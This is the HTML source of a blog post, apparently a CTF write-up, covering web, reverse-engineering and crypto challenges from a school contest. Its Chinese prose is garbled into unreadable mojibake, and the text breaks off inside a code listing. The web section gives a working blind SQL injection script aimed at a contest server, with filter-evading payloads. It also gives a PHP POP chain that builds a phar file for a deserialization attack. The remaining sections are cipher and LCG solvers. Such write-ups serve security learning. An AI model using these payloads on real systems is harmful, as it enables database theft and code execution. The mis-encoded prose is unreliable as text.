    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>éœ‡æƒŠï¼å¹³å¹³æ— å¥‡çš„webæ‰‹ï¼Œç«Ÿç„¶æŠŠcrypto akäº†ï¼Œé¡ºå¸¦åšäº†2ä¸ªreå’Œå‡ ä¸ªmiscã€‚ã€‚ã€‚</p><p>æ ¡èµ›æ„Ÿè§‰éš¾åº¦ä¸€èˆ¬ï¼Œå°±æ˜¯ç»™å…¥é—¨çš„åšäº†ï¼Œæš‘å‡å­¦çš„å¥½å¤šéƒ½ç”¨ä¸Šäº†ï¼Œæ„Ÿè§‰ä¸é”™ã€‚ä¸è¿‡æŒç»­æ—¶é—´å¤ªé•¿äº†ï¼Œç›´æ¥7å¤©ï¼Œè€Œä¸”å›½åº†é‚£å‡ å¤©è´¼å¿™ï¼Œéƒ¨é—¨ã€å·¥ä½œå®¤ã€æ–°ç”ŸÂ·Â·Â·Â·Â·Â·æ—¶é—´ä¸æ˜¯å¾ˆåˆç†ï¼Œæœ€åå‡ å¤©ç›´æ¥æ‘†çƒ‚äº†ï¼Œä¸€ä¸ªé¢˜ä¹Ÿæ²¡åšã€‚</p><span id="more"></span><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><blockquote><p>æ— åˆ—åæ³¨å…¥ï¼Œå’Œå¯’å‡èµ›çš„ç±»ä¼¼</p></blockquote><p>åº“åè¿˜æ˜¯cumtctf</p><p>çˆ†è¡¨åå¾—åˆ°flag_table_1</p><p>æ— åˆ—åæ³¨å…¥å¾—åˆ°flagï¼Œéœ€è¦å˜æˆå°å†™</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://81.69.241.44:25500/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">s = <span class="string">&quot;-&#123;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789,_!@#$%^&amp;*()&#125;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">for i in range(1,1000):</span></span><br><span class="line"><span class="string">    for j in s:</span></span><br><span class="line"><span class="string">        time.sleep(0.1)</span></span><br><span class="line"><span class="string">        payload = &quot;1&#x27;/**/||/**/!(ascii(mid((select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/!(database_name&lt;&gt;&#x27;cumtctf&#x27;)),&#123;&#125;,1))&lt;&gt;ascii(&#x27;&#123;&#125;&#x27;))#&quot;.format(i, j)</span></span><br><span class="line"><span class="string">        data = &#123;</span></span><br><span class="line"><span class="string">            &#x27;username&#x27;: payload,</span></span><br><span class="line"><span class="string">            &#x27;password&#x27;: &#x27;1&#x27;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        res = requests.post(url=url, headers=headers, data=data).text</span></span><br><span class="line"><span class="string">        if res.find(&#x27;good&#x27;) != -1:</span></span><br><span class="line"><span class="string">            table += j</span></span><br><span class="line"><span class="string">            print(table)</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">payload2 = &quot;1&#x27;/**/||/**/!(mid((select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/!(database_name&lt;&gt;&#x27;cumtctf&#x27;)),1,34)&lt;&gt;&#x27;address,email,flag_table_1,users&#x27;)#;&quot;</span></span><br><span class="line"><span class="string">data = &#123;</span></span><br><span class="line"><span class="string">    &#x27;username&#x27;: payload2,</span></span><br><span class="line"><span class="string">    &#x27;password&#x27;: &#x27;1&#x27;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">res = requests.post(url=url, headers=headers, data=data).text</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">payload3 = &quot;1&#x27;/**/||/**/(1,1)&gt;(select/**/*/**/from/**/flag_table_1/**/limit/**/0,1)#;&quot;</span></span><br><span class="line"><span class="string">data = &#123;</span></span><br><span class="line"><span class="string">    &#x27;username&#x27;: payload3,</span></span><br><span class="line"><span class="string">    &#x27;password&#x27;: &#x27;1&#x27;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">res = requests.post(url=url, headers=headers, data=data).text</span></span><br><span class="line"><span class="string">print(res)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trans</span>(<span class="params">flag</span>):</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">        res += <span class="built_in">hex</span>(<span class="built_in">ord</span>(i))</span><br><span class="line">    res = <span class="string">&#x27;0x&#x27;</span> + res.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>): </span><br><span class="line">    time.sleep(<span class="number">0.01</span>)</span><br><span class="line">    hexchar = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">    <span class="comment"># for j in s:</span></span><br><span class="line">        hexchar = trans(flag+ <span class="built_in">chr</span>(char))</span><br><span class="line">        payload = <span class="string">&quot;0&#x27;||/**/if((select/**/(0,&#123;&#125;)&gt;(select/**/*/**/from/**/flag_table_1/**/limit/**/0,1)),1,0)#&quot;</span>.<span class="built_in">format</span>(hexchar)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url, data=data).text</span><br><span class="line">        <span class="keyword">if</span> r.find(<span class="string">&#x27;good&#x27;</span>) != -<span class="number">1</span>:</span><br><span class="line">            flag += <span class="built_in">chr</span>(char-<span class="number">1</span>)</span><br><span class="line">            <span class="comment"># flag += j</span></span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><blockquote><p>pharååºåˆ—åŒ–</p></blockquote><p>å…ˆé€šè¿‡ä»»æ„æ–‡ä»¶è¯»å–è·å¾—class file fun classè¿™äº›phpæ–‡ä»¶ï¼Œä»£ç å®¡è®¡</p><p>æ„é€ popé“¾ï¼Œç”Ÿæˆpharæ–‡ä»¶</p><p>çœ‹åˆ°å·²ç»æœ‰å…¶ä»–é˜Ÿä¼æŠŠè¿™é¢˜åšå‡ºæ¥äº†ï¼Œæ­¤æ—¶å…ˆæµ‹è¯•çœ‹çœ‹èƒ½ä¸èƒ½è¿ä¸Šåˆ«çš„é˜Ÿä¼ä¸Šä¼ æˆåŠŸçš„æ–‡ä»¶ï¼Œæ ¹æ®file.phpä¸­å¯¹æ–‡ä»¶åçš„å¤„ç†ï¼Œéšä¾¿æµ‹è¯•äº†å‡ ä¸ªï¼Œå‘ç°phar.jpgå¤„ç†åçš„æ–‡ä»¶è·¯å¾„èƒ½ç”¨ï¼Œè·å¾—flag</p><p>ä¸‹é¢è´´ä¸Šè‡ªå·±å†™çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fakefile</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Docker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$container1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$container2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cloud</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$docker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;value = <span class="string">&quot;/var/www/html/flag.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$File</span> = <span class="keyword">new</span> File();</span><br><span class="line"><span class="variable">$docker</span> = <span class="keyword">new</span> Docker();</span><br><span class="line"><span class="variable">$cloud</span> = <span class="keyword">new</span> Cloud();</span><br><span class="line"></span><br><span class="line"><span class="variable">$cloud</span>-&gt;docker = <span class="string">&#x27;O\:6\:\&quot;Docker\&quot;\:3\:\&#123;s\:3\:\&quot;str\&quot;\;s\:4\:\&quot;haha\&quot;\;s\:10\:\&quot;container1\&quot;\;s\:4\:\&quot;haha\&quot;\;s\:10\:\&quot;container2\&quot;\;s\:4\:\&quot;haha\&quot;\;\&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$File</span>-&gt;file = <span class="variable">$docker</span>;</span><br><span class="line"><span class="variable">$docker</span>-&gt;str = <span class="variable">$cloud</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$File</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><p>ç›´æ¥æ‹–åˆ°idaé‡Œï¼Œå¾—åˆ°flag</p><p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/QQ%E6%88%AA%E5%9B%BE20211003125756.png"></p><h3 id="net"><a href="#net" class="headerlink" title="net"></a>net</h3><p>æ‹–åˆ°ILSpyé‡Œï¼Œè·å¾—é€†å‘ä»£ç </p><p>ç®€å•å†™ä¸ªè„šæœ¬</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ppp</span>(<span class="params">a, b, c</span>):</span></span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    a %= c</span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> b % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            num = num * a % c</span><br><span class="line">        b &gt;&gt;= <span class="number">1</span></span><br><span class="line">        a = a * a % c      </span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line">array2 = [</span><br><span class="line">            <span class="number">30361</span>,</span><br><span class="line"><span class="number">550</span>,</span><br><span class="line"><span class="number">595</span>,</span><br><span class="line"><span class="number">15412</span>,</span><br><span class="line"><span class="number">30361</span>,</span><br><span class="line"><span class="number">15412</span>,</span><br><span class="line"><span class="number">8346</span>,</span><br><span class="line"><span class="number">27071</span>,</span><br><span class="line"><span class="number">37594</span>,</span><br><span class="line"><span class="number">37534</span>,</span><br><span class="line"><span class="number">9781</span>,</span><br><span class="line"><span class="number">1082</span>,</span><br><span class="line"><span class="number">19619</span>,</span><br><span class="line"><span class="number">9781</span>,</span><br><span class="line"><span class="number">1082</span>,</span><br><span class="line"><span class="number">15513</span>,</span><br><span class="line"><span class="number">29591</span>,</span><br><span class="line"><span class="number">19596</span>,</span><br><span class="line"><span class="number">30078</span>,</span><br><span class="line"><span class="number">27942</span>,</span><br><span class="line"><span class="number">25366</span>,</span><br><span class="line"><span class="number">29107</span>,</span><br><span class="line"><span class="number">7433</span>,</span><br><span class="line"><span class="number">28493</span>,</span><br><span class="line"><span class="number">9781</span>,</span><br><span class="line"><span class="number">29591</span>,</span><br><span class="line"><span class="number">2664</span>,</span><br><span class="line"><span class="number">12540</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">test = []</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(array2)):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100000</span>):</span><br><span class="line">        <span class="keyword">if</span> array2[j] == ppp(i, <span class="number">377</span>, <span class="number">38009</span>):</span><br><span class="line">            test.append(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> test:</span><br><span class="line">        print(<span class="built_in">chr</span>(j-i), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>è·‘å‡ºflag</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="ç­¾åˆ°-1"><a href="#ç­¾åˆ°-1" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><p>ç®€å•å†™ä¸ªè„šæœ¬çˆ†ç ´</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">table=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">a = <span class="number">37</span></span><br><span class="line">b = <span class="number">23</span></span><br><span class="line">c = <span class="number">52</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">def affine(m,a,b,c):</span></span><br><span class="line"><span class="string">    chipher=&#x27;&#x27;</span></span><br><span class="line"><span class="string">    for i in range(len(m)):</span></span><br><span class="line"><span class="string">        if m[i] in table:</span></span><br><span class="line"><span class="string">            chipher+=table[(a*(table.find(m[i]))+b)%c]</span></span><br><span class="line"><span class="string">        else:</span></span><br><span class="line"><span class="string">            chipher+=m[i]</span></span><br><span class="line"><span class="string">    return chipher</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">t = <span class="string">&#x27;aoxL&#123;Fw0_TXk_y3xtW_ZP_TCBg7VLCxGwb&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t)):</span><br><span class="line">    <span class="keyword">if</span> t[i] <span class="keyword">in</span> table:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> table:</span><br><span class="line">            <span class="keyword">if</span> table[(a*(table.find(j))+b)%c] == t[i]:</span><br><span class="line">                flag += j</span><br><span class="line">                print(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += t[i]</span><br><span class="line">        print(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="lcg"><a href="#lcg" class="headerlink" title="lcg"></a>lcg</h3><p>ä»ç½‘ä¸Šæ‰¾ä¸ªä¸ªè„šæœ¬ï¼Œå†™çš„å¾ˆè¯¦ç»†</p><p><a href="https://blog.csdn.net/superprintf/article/details/108964563">https://blog.csdn.net/superprintf/article/details/108964563</a></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">flag = &#x27;&#x27;.encode()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">seed = bytes_to_long(flag)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(seed)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">length = seed.bit_length()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(length)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">n=getPrime(length)</span></span><br><span class="line"><span class="string">a=getPrime(length)</span></span><br><span class="line"><span class="string">b=getPrime(length)</span></span><br><span class="line"><span class="string">s=[]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(10):</span></span><br><span class="line"><span class="string">    seed = (a*seed+b)%n</span></span><br><span class="line"><span class="string">    s.append(seed)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(s)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">a,b</span>):</span> </span><br><span class="line">    <span class="keyword">if</span>(b==<span class="number">0</span>): </span><br><span class="line">        <span class="keyword">return</span> a </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> gcd(b,a%b) </span><br><span class="line">s=[<span class="number">64053834035066785058511795263859088093402576718387054930069870694827422995248363210875296865931156540418540088656840163752864867889701529</span>, <span class="number">62747878069691338351001678737533032651009187924993079609551517187402239263500990458468121965725468864035542647616568888614971291913860683</span>, <span class="number">8610389166165547798963079074461089122942923569827711232062490735297527674581120584017030806864406444034839689358368567214353599295961192</span>, <span class="number">67368398051089407366868405625671942347378755129423872678285919732014302509367453094142041707571135936337763803644340301362544880144675515</span>, <span class="number">3140546334522640626644397935274312967014650101920766829848908314358452633165879115222769049730993718556007257838431843662986174886332684</span>, <span class="number">86570894867827558107244361752089586436766881136739525172025909326268148819720261812567282066327259810017581923500053674785415315313293458</span>, <span class="number">74270633946662538117925791534180331044438757906314082041974053142483165604719102121031974214138125154407150853174565679126633465007917723</span>, <span class="number">82222345180880564316408536364709779418528442531150999715627704885024880160675971236916036110841803202987616501846568355385621016171784903</span>, <span class="number">79833541796675422937999973936505826001046326324194169378072775519666431460490483847928549009565561011528302879850550395115321828798479473</span>, <span class="number">70276250399219459795079058514491950109021040664671993784167534811426903455184545174600178849521746939676479421177456528336980088529680364</span>]</span><br><span class="line">t = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    t.append(s[i]-s[i-<span class="number">1</span>]) </span><br><span class="line">all_n = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    all_n.append(gcd((t[i+<span class="number">1</span>]*t[i-<span class="number">1</span>]-t[i]*t[i]), (t[i+<span class="number">2</span>]*t[i]-t[i+<span class="number">1</span>]*t[i+<span class="number">1</span>]))) </span><br><span class="line"></span><br><span class="line">MMI = <span class="keyword">lambda</span> A, n,s=<span class="number">1</span>,t=<span class="number">0</span>,N=<span class="number">0</span>: (n &lt; <span class="number">2</span> <span class="keyword">and</span> t%N <span class="keyword">or</span> MMI(n, A%n, t, s-A//n*t, N <span class="keyword">or</span> n),-<span class="number">1</span>)[n&lt;<span class="number">1</span>] <span class="comment">#é€†å…ƒè®¡ç®—</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> all_n:</span><br><span class="line">    n=<span class="built_in">abs</span>(n)</span><br><span class="line">    <span class="keyword">if</span> n==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    a=(s[<span class="number">2</span>]-s[<span class="number">1</span>])*MMI((s[<span class="number">1</span>]-s[<span class="number">0</span>]),n)%n</span><br><span class="line">    ani=MMI(a,n)</span><br><span class="line">    b=(s[<span class="number">1</span>]-a*s[<span class="number">0</span>])%n</span><br><span class="line">    seed = (ani*(s[<span class="number">0</span>]-b))%n</span><br><span class="line">    plaintext=seed</span><br><span class="line">    print(long_to_bytes(plaintext))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Dear-Alice"><a href="#Dear-Alice" class="headerlink" title="Dear Alice"></a>Dear Alice</h3><p>google ctf 2021åŸé¢˜</p><p><a href="https://github.com/Haorical/Wargames/tree/master/google-2021/h1">https://github.com/Haorical/Wargames/tree/master/google-2021/h1</a></p><p>å«–åˆ°è„šæœ¬</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span 